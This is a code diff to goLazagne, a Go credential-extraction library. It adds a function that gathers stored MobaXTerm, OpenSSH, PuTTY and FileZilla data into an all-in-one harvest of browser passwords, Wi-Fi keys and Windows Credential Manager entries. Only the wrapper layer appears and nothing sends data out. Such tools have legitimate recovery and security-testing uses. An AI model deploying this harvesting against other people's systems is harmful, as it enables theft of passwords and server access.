@@ -4,11 +4,15 @@ import (
 	"github.com/kerbyj/goLazagne/browsers"
 	"github.com/kerbyj/goLazagne/common"
 	"github.com/kerbyj/goLazagne/filesystem"
+	"github.com/kerbyj/goLazagne/sysadmin"
+	"github.com/kerbyj/goLazagne/types"
 	"github.com/kerbyj/goLazagne/wifi"
 	"github.com/kerbyj/goLazagne/windows"
 )
 
-//Common function for work with browsers. Just call and function return all saved passwords in chromium browsers and firefox
+/**
+Common function for work with browsers. Just call and function return all saved passwords in chromium browsers and firefox
+*/
 func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 	var AllBrowsersData []common.UrlNamePass
 	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
@@ -26,12 +30,16 @@ func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 	return AllBrowsersData, len(AllBrowsersData)
 }
 
-// Function that check saved credentials in chromium based browsers
+/*
+	Function that check saved credentials in chromium based browsers
+*/
 func ExtractChromiumCredentials() common.ExtractCredentialsResult {
 	return browsers.ChromeExtractDataRun()
 }
 
-// Function that check saved credentials in firefox browser and thunderbird
+/**
+Function that check saved credentials in firefox browser and thunderbird
+*/
 func ExtractFirefoxCredentials() common.ExtractCredentialsResult {
 	return browsers.MozillaExtractDataRun()
 }
@@ -64,10 +72,45 @@ func ExtractInterestingFiles(suffixes []string) []string {
 	return filesystem.FindFiles(suffixes)
 }
 
+type SysadminData struct {
+	MobaXTerm []types.MobaData      `json:"moba_x_term"`
+	OpenSsh   types.OpensshData     `json:"open_ssh"`
+	Putty     []types.PuttyData     `json:"putty"`
+	Filezilla []types.FileZillaData `json:"filezilla"`
+}
+
+func ExtractSysadminData() SysadminData {
+	var outdata SysadminData
+
+	mobaData, errExtractMobaData := sysadmin.MobaExtractDataRun()
+	openssh, errOpenSsh := sysadmin.OpensshExtractDataRun()
+	putty, errPutty := sysadmin.PuttyExtractDataRun()
+	filezilla, errFileZilla := sysadmin.FilezillaExtractDataRun()
+
+	if errExtractMobaData == nil {
+		outdata.MobaXTerm = mobaData
+	}
+
+	if errOpenSsh == nil {
+		outdata.OpenSsh = openssh
+	}
+
+	if errPutty == nil {
+		outdata.Putty = putty
+	}
+
+	if errFileZilla == nil {
+		outdata.Filezilla = filezilla
+	}
+
+	return outdata
+}
+
 type AllDataStruct struct {
-	WifiData    []common.NamePass    `json:"wifi"`
-	BrowserData []common.UrlNamePass `json:"browser"`
-	CredmanData []common.UrlNamePass `json:"credman"`
+	WifiData     []common.NamePass    `json:"wifi"`
+	BrowserData  []common.UrlNamePass `json:"browser"`
+	CredmanData  []common.UrlNamePass `json:"credman"`
+	SysadminData SysadminData         `json:"sysadmin_data"`
 }
 
 //Function in "give me all" style. The function will return everything that the program can extract from OS.
@@ -75,6 +118,7 @@ func ExtractAllData() (AllDataStruct, int) {
 	var wifiData, lengthWiFiData = ExtractWifiData()
 	var browserData, lengthBrowserData = ExtractBrowserCredentials()
 	var credmanData, lengthCredmanData = ExtractCredmanData()
+	var sysadminData = ExtractSysadminData()
 
 	var outDataStruct AllDataStruct
 
@@ -87,6 +131,7 @@ func ExtractAllData() (AllDataStruct, int) {
 	if lengthCredmanData > 0 {
 		outDataStruct.CredmanData = credmanData
 	}
+	outDataStruct.SysadminData = sysadminData
 
 	return outDataStruct, lengthCredmanData + lengthBrowserData + lengthWiFiData
 }
